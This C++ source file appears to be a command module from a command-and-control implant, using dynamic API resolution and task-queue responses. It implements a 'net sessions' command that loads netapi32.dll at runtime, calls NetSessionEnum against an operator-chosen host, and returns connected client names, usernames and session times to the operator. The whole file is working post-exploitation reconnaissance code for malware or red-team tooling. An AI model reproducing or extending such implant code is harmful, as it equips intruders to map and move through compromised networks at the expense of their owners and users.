#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NET_SESSIONS

using namespace stardust;
using namespace starburst;

typedef struct _SESSION_INFO_10 {
    LPWSTR sesi10_cname;
    LPWSTR sesi10_username;
    DWORD  sesi10_time;
    DWORD  sesi10_idle_time;
} SESSION_INFO_10;

typedef DWORD (WINAPI *fn_NetSessionEnum)( LPWSTR, LPWSTR, LPWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD );
typedef DWORD (WINAPI *fn_NetApiBufferFree)( LPVOID );

auto declfn starburst::cmd_net_sessions(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "netapi32.dll" ) ) );
    if ( !h_netapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
        return;
    }

    auto pNetSessionEnum = reinterpret_cast<fn_NetSessionEnum>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetSessionEnum" ) ) );
    auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
    if ( !pNetSessionEnum || !pNetApiBufferFree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );

    wchar_t w_host[256] = { 0 };
    wchar_t* p_host = nullptr;
    if ( host_str && host_len > 0 ) {
        char host_buf[256] = { 0 };
        memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
        p_host = w_host;
    }

    LPBYTE buf = nullptr;
    DWORD entries_read = 0, total_entries = 0;
    DWORD resume = 0;

    DWORD status = pNetSessionEnum(
        p_host, nullptr, nullptr, 10, &buf, 0xFFFFFFFF,
        &entries_read, &total_entries, &resume );

    if ( status != 0 && status != 234 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NetSessionEnum failed" ) ) );
        return;
    }

    uint32_t out_cap = 16384;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        pNetApiBufferFree( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;

    str_copy( output + off, symbol<char*>( const_cast<char*>(
        "Client\tUser\tTime\tIdleTime\n" ) ) );
    off = str_len( output );

    auto sessions = reinterpret_cast<SESSION_INFO_10*>( buf );
    for ( DWORD i = 0; i < entries_read && off + 520 < out_cap; i++ ) {
        // client name
        if ( sessions[i].sesi10_cname ) {
            char name[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, sessions[i].sesi10_cname, -1, name, 260, nullptr, nullptr );
            uint32_t nlen = str_len( name );
            memory::copy( output + off, name, nlen );
            off += nlen;
        }
        output[off++] = '\t';

        // username
        if ( sessions[i].sesi10_username ) {
            char user[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, sessions[i].sesi10_username, -1, user, 260, nullptr, nullptr );
            uint32_t ulen = str_len( user );
            memory::copy( output + off, user, ulen );
            off += ulen;
        }
        output[off++] = '\t';

        // time (seconds)
        char num[16];
        int_to_str( num, sessions[i].sesi10_time, 10 );
        uint32_t tlen = str_len( num );
        memory::copy( output + off, num, tlen );
        off += tlen;
        output[off++] = '\t';

        // idle time (seconds)
        int_to_str( num, sessions[i].sesi10_idle_time, 10 );
        uint32_t ilen = str_len( num );
        memory::copy( output + off, num, ilen );
        off += ilen;

        output[off++] = '\n';
    }

    output[off] = '\0';
    pNetApiBufferFree( buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
